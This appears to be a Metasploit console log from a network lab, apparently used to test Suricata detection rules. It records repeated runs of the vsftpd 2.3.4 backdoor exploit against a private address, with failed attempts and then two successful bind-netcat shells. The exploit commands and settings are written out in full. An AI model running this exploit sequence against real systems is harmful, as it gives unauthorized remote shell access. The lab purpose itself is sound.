@@ -1,0 +1,186 @@
+[*] Spooling to file scenarios/D_metasploit/results/msf_console.log...
+resource (scenarios/D_metasploit/attack.rc)> use exploit/unix/ftp/vsftpd_234_backdoor
+[*] Using configured payload cmd/linux/http/x86/meterpreter_reverse_tcp
+resource (scenarios/D_metasploit/attack.rc)> show options
+
+Module options (exploit/unix/ftp/vsftpd_234_backdoor):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT   21               yes       The target port (TCP)
+
+Payload options (cmd/linux/http/x86/meterpreter_reverse_tcp):
+
+   Name            Current Setting  Required  Description
+   ----            ---------------  --------  -----------
+   FETCH_COMMAND   CURL             yes       Command to fetch payload (Accepted: CURL, FTP, TFTP, TNFTP, WGET)
+   FETCH_DELETE    false            yes       Attempt to delete the binary after execution
+   FETCH_FILELESS  none             yes       Attempt to run payload without touching disk by using anonymous handles, requires Linux >=3.17
+   FETCH_SRVHOST                    no        Local IP to use for serving payload
+   FETCH_SRVPORT   8080             yes       Local port to use for serving payload
+   FETCH_URIPATH                    no        Local URI to use for serving payload
+   LHOST                            yes       The listen address (an interface may be specified)
+   LPORT           4444             yes       The listen port
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Linux/Unix Command
+
+resource (scenarios/D_metasploit/attack.rc)> set RHOSTS 10.0.10.30
+RHOSTS => 10.0.10.30
+resource (scenarios/D_metasploit/attack.rc)> set RPORT 21
+RPORT => 21
+resource (scenarios/D_metasploit/attack.rc)> run
+[-] 10.0.10.30:21 - Msf::OptionValidateError One or more options failed to validate: LHOST.
+resource (scenarios/D_metasploit/attack.rc)> sessions -l
+
+Active sessions
+===============
+
+No active sessions.
+
+resource (scenarios/D_metasploit/attack.rc)> spool off
+
+# --- Tentative suivante : payload par défaut toujours incompatible (LHOST requis), ---
+# --- répétée à l'identique deux fois de plus avant correction du script ---
+
+[*] Spooling to file scenarios/D_metasploit/results/msf_console.log...
+resource (scenarios/D_metasploit/attack.rc)> use exploit/unix/ftp/vsftpd_234_backdoor
+[*] Using configured payload cmd/linux/http/x86/meterpreter_reverse_tcp
+resource (scenarios/D_metasploit/attack.rc)> set RHOSTS 10.0.10.30
+RHOSTS => 10.0.10.30
+resource (scenarios/D_metasploit/attack.rc)> set RPORT 21
+RPORT => 21
+resource (scenarios/D_metasploit/attack.rc)> run
+[-] 10.0.10.30:21 - Msf::OptionValidateError One or more options failed to validate: LHOST.
+resource (scenarios/D_metasploit/attack.rc)> sessions -l
+
+Active sessions
+===============
+
+No active sessions.
+
+resource (scenarios/D_metasploit/attack.rc)> spool off
+
+[*] Spooling to file scenarios/D_metasploit/results/msf_console.log...
+resource (scenarios/D_metasploit/attack.rc)> use exploit/unix/ftp/vsftpd_234_backdoor
+[*] Using configured payload cmd/linux/http/x86/meterpreter_reverse_tcp
+resource (scenarios/D_metasploit/attack.rc)> set RHOSTS 10.0.10.30
+RHOSTS => 10.0.10.30
+resource (scenarios/D_metasploit/attack.rc)> set RPORT 21
+RPORT => 21
+resource (scenarios/D_metasploit/attack.rc)> run
+[-] 10.0.10.30:21 - Msf::OptionValidateError One or more options failed to validate: LHOST.
+resource (scenarios/D_metasploit/attack.rc)> sessions -l
+
+Active sessions
+===============
+
+No active sessions.
+
+resource (scenarios/D_metasploit/attack.rc)> spool off
+
+# --- Premier essai avec payload bind_netcat configuré : backdoor déjà dans un état ---
+# --- orphelin suite aux tests manuels précédents dans la session ---
+
+[*] Spooling to file scenarios/D_metasploit/results/msf_console.log...
+resource (scenarios/D_metasploit/attack.rc)> use exploit/unix/ftp/vsftpd_234_backdoor
+[*] Using configured payload cmd/linux/http/x86/meterpreter_reverse_tcp
+resource (scenarios/D_metasploit/attack.rc)> set RHOSTS 10.0.10.30
+RHOSTS => 10.0.10.30
+resource (scenarios/D_metasploit/attack.rc)> set RPORT 21
+RPORT => 21
+resource (scenarios/D_metasploit/attack.rc)> set PAYLOAD cmd/unix/bind_netcat
+PAYLOAD => cmd/unix/bind_netcat
+resource (scenarios/D_metasploit/attack.rc)> set RHOST 10.0.10.30
+RHOST => 10.0.10.30
+resource (scenarios/D_metasploit/attack.rc)> set LPORT 6201
+LPORT => 6201
+resource (scenarios/D_metasploit/attack.rc)> run
+[!] 10.0.10.30:21 - The port used by the backdoor bind listener is already open. Trying...
+[-] 10.0.10.30:21 - The service on port 6200/TCP does not appear to be a fresh shell. Already exploited?
+[-] 10.0.10.30:21 - Exploit aborted due to failure: none: Backdoor already in-use
+[*] Exploit completed, but no session was created.
+resource (scenarios/D_metasploit/attack.rc)> sessions -l
+
+Active sessions
+===============
+
+No active sessions.
+
+resource (scenarios/D_metasploit/attack.rc)> spool off
+
+# --- SUCCÈS N°1 : cycle propre après resynchronisation du script sur kali-attacker ---
+
+[*] Spooling to file scenarios/D_metasploit/results/msf_console.log...
+resource (scenarios/D_metasploit/attack.rc)> use exploit/unix/ftp/vsftpd_234_backdoor
+[*] Using configured payload cmd/linux/http/x86/meterpreter_reverse_tcp
+resource (scenarios/D_metasploit/attack.rc)> set RHOSTS 10.0.10.30
+RHOSTS => 10.0.10.30
+resource (scenarios/D_metasploit/attack.rc)> set RPORT 21
+RPORT => 21
+resource (scenarios/D_metasploit/attack.rc)> set PAYLOAD cmd/unix/bind_netcat
+PAYLOAD => cmd/unix/bind_netcat
+resource (scenarios/D_metasploit/attack.rc)> set RHOST 10.0.10.30
+RHOST => 10.0.10.30
+resource (scenarios/D_metasploit/attack.rc)> set LPORT 6201
+LPORT => 6201
+resource (scenarios/D_metasploit/attack.rc)> run
+[+] 10.0.10.30:21 - Backdoor has been spawned!
+[*] Started bind TCP handler against 10.0.10.30:6201
+[*] Command shell session 1 opened (192.168.1.50:45521 -> 10.0.10.30:6201) at 2026-08-05 19:07:17 +0200
+
+[*] Wrong number of arguments expected: 1, received: 2
+Usage: sessions <id>
+
+Interact with a different session Id.
+This command only accepts one positive numeric argument.
+This works the same as calling this from the MSF shell: sessions -i <session id>
+
+/bin/sh: line 3: exitsessions: command not found
+
+Abort session 1? [y/N]
+[*] 10.0.10.30 - Command shell session 1 closed.  Reason: User exit
+resource (scenarios/D_metasploit/attack.rc)> sessions -l
+
+Active sessions
+===============
+
+No active sessions.
+
+resource (scenarios/D_metasploit/attack.rc)> spool off
+
+# --- SUCCÈS N°2 : deuxième cycle propre, après restauration des règles Suricata ---
+# --- Scénario D (SID 1000401/1000402) suite au rebuild/recréation du nœud GNS3 ---
+
+[*] Spooling to file scenarios/D_metasploit/results/msf_console.log...
+resource (scenarios/D_metasploit/attack.rc)> use exploit/unix/ftp/vsftpd_234_backdoor
+[*] Using configured payload cmd/linux/http/x86/meterpreter_reverse_tcp
+resource (scenarios/D_metasploit/attack.rc)> set RHOSTS 10.0.10.30
+RHOSTS => 10.0.10.30
+resource (scenarios/D_metasploit/attack.rc)> set RPORT 21
+RPORT => 21
+resource (scenarios/D_metasploit/attack.rc)> set PAYLOAD cmd/unix/bind_netcat
+PAYLOAD => cmd/unix/bind_netcat
+resource (scenarios/D_metasploit/attack.rc)> set RHOST 10.0.10.30
+RHOST => 10.0.10.30
+resource (scenarios/D_metasploit/attack.rc)> set LPORT 6201
+LPORT => 6201
+resource (scenarios/D_metasploit/attack.rc)> run
+[+] 10.0.10.30:21 - Backdoor has been spawned!
+[*] Started bind TCP handler against 10.0.10.30:6201
+[*] Command shell session 1 opened (192.168.1.50:42879 -> 10.0.10.30:6201) at 2026-08-05 20:07:57 +0200
+
+Abort session 1? [y/N]
+[*] 10.0.10.30 - Command shell session 1 closed.  Reason: User exit
+resource (scenarios/D_metasploit/attack.rc)> sessions -l
+
+Active sessions
+===============
+
+No active sessions.
+
+resource (scenarios/D_metasploit/attack.rc)> spool off
